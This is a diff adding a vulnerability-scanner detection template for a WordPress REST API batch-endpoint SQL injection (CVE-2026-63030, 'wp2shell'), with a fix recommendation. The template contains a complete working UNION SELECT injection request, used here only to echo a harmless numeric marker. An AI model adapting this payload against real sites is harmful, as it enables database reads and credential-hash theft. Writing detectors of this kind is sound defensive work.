@@ -1,0 +1,98 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+info: {
+  type: VULN_DETECTION
+  name: "WordPress_CVE_2026_63030"
+  author: "Alessandro Versari <alessandro.versari@doyensec.com>"
+  version: "0.1"
+  description: "Detects CVE-2026-63030 (aka 'wp2shell'), a pre-authentication SQL injection in the WordPress core REST API batch endpoint."
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2026-63030"
+  }
+  severity: CRITICAL
+  title: "WordPress Core REST API Batch Endpoint SQL Injection (CVE-2026-63030 / wp2shell)"
+  description: "WordPress core versions 6.9.0-6.9.4 and 7.0.0-7.0.1 are affected by a pre-authentication SQL injection vulnerability, publicly disclosed as 'wp2shell'. The `/batch/v1` REST API endpoint allows an unauthenticated attacker to nest a request to `/wp/v2/posts` inside a batch request. Nesting the request bypasses the normal sanitization applied to the `author_exclude` collection parameter, which is concatenated unsanitized into the underlying SQL query, allowing an attacker to append a UNION SELECT statement. This lets an unauthenticated attacker read arbitrary data from the WordPress database, including user credential hashes from the wp_users table, and has been reported by researchers to be escalatable to remote code execution."
+  recommendation: "Update WordPress core to version 7.0.2 (or 6.9.5 on the 6.9.x branch) or later, as described in the official WordPress 7.0.2 security release."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2026-63030"
+  }
+}
+
+config: {}
+
+actions: {
+  name: "fingerprint_wordpress_batch_api"
+  http_request: {
+    method: GET
+    uri: "/?rest_route=/"
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          { variable_name: "wp_rest_namespace" regexp: "(wp.{1,2}v2)" from_body: {} },
+          { variable_name: "wp_batch_namespace" regexp: "(batch.{1,2}v1)" from_body: {} }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+
+  # Nests a request to /wp/v2/posts inside a /batch/v1 batch request
+  # (bypassing normal `author_exclude` sanitization) and appends a 23-column
+  # UNION SELECT matching the wp_posts column order, so `SELECT {{
+  # wp2shell_factor_a }}*{{ wp2shell_factor_b }}` lands in the `post_title`
+  # field (column 6) and is echoed back as "||{{ wp2shell_product_hex }}||".
+  # The two factors are multiplied by the SQL server itself so a match proves
+  # the query is actually parsed and executed. The forged row (and the
+  # /wp/v2/posts/<id> vehicle used to smuggle it) both use post ID 0, which
+  # is never a real WordPress post ID (auto-increment starts at 1) to avoid
+  # any collision with real content.
+  name: "exploit_batch_v1_union_sqli"
+  http_request: {
+    method: POST
+    uri: "/?rest_route=/batch/v1"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"requests\": [{\"method\": \"POST\", \"path\": \"http://:\"}, {\"method\": \"POST\", \"path\": \"/wp/v2/posts\", \"body\": {\"requests\": [{\"method\": \"GET\", \"path\": \"http://:\"}, {\"method\": \"GET\", \"path\": \"/wp/v2/posts/0?author_exclude=0%29+UNION+SELECT+0%2C2%2C0x{{ wp2shell_date_hex }}%2C0x{{ wp2shell_date_hex }}%2C5%2CCONCAT%280x7c7c%2CHEX%28CAST%28%28SELECT+{{ wp2shell_factor_a }}%2A{{ wp2shell_factor_b }}%29AS+CHAR%29%29%2C0x7c7c%29%2C7%2C0x7075626c697368%2C9%2C10%2C11%2C12%2C13%2C14%2C0x{{ wp2shell_date_hex }}%2C0x{{ wp2shell_date_hex }}%2C17%2C18%2C19%2C20%2C0x706f7374%2C22%2C23--+-&orderby=none&per_page=500\"}, {\"method\": \"GET\", \"path\": \"/wp/v2/posts\"}]}}, {\"method\": \"POST\", \"path\": \"/batch/v1\"}]}"
+    response: {
+      http_status: 207
+      expect_all: {
+        conditions: [
+          { body: {} contains: "||{{ wp2shell_product_hex }}||" }
+        ]
+      }
+      extract_all: {
+        patterns: [
+          {
+            variable_name: "sqli_marker"
+            regexp: "\\|\\|([0-9A-Fa-f]+)\\|\\|"
+            from_body: {}
+          }
+        ]
+      }
+    }
+  }
+}
+
+workflows: {
+  variables: [
+    { name: "wp2shell_date_hex" value: "323032302d30312d30312030303a30303a3030" },
+    { name: "wp2shell_factor_a" value: "48271" },
+    { name: "wp2shell_factor_b" value: "90007" },
+    { name: "wp2shell_product_hex" value: "34333434373237383937" }
+  ]
+
+  actions: [
+    "fingerprint_wordpress_batch_api",
+    "exploit_batch_v1_union_sqli"
+  ]
+}
